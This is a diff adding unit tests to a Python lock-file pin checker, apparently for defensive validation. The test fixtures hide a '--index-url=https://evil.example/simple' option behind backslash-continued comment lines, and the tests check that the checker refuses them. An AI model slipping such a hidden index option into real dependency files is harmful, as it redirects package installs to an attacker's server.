@@ -199,6 +199,27 @@ class LockTests(PinCase):
         )
         self.assertEqual(self.findings(), [])
 
+    def test_a_continuation_cannot_hide_an_option_from_the_check(self) -> None:
+        """The two shapes install_runtime refuses are refused here too: the line is not a pin."""
+        hashed = f"alpha==1.0 {HASH}"
+        shapes = {
+            "a comment-only line after a continued line": (
+                f"{hashed} \\\n # c \\\n--index-url=https://evil.example/simple\n"
+            ),
+            "a space after the backslash, then a comment": (
+                f"{hashed} # c \\ \n--index-url=https://evil.example/simple\n"
+            ),
+        }
+        for name, text in shapes.items():
+            with self.subTest(shape=name):
+                self.put_lock(lock_text() + text)
+                self.assert_found("is not name==version: 'alpha==1.0 ")
+
+    def test_the_lock_reader_and_its_markers_are_the_runtime_programs(self) -> None:
+        """One home: the reader and the marker set come from install_runtime.py, with no copy."""
+        self.assertIs(check_pins.RUNTIME.logical_lines, check_pins.logical_lines)
+        self.assertEqual(check_pins.RUNTIME.MARKER_CHARS, check_pins.MARKER_CHARS)
+
     def test_name_spelling_is_normalised(self) -> None:
         """An underscore or capital in the name still counts as the tool."""
         self.put_lock(lock_text().replace("molecule-plugins", "Molecule_Plugins"))
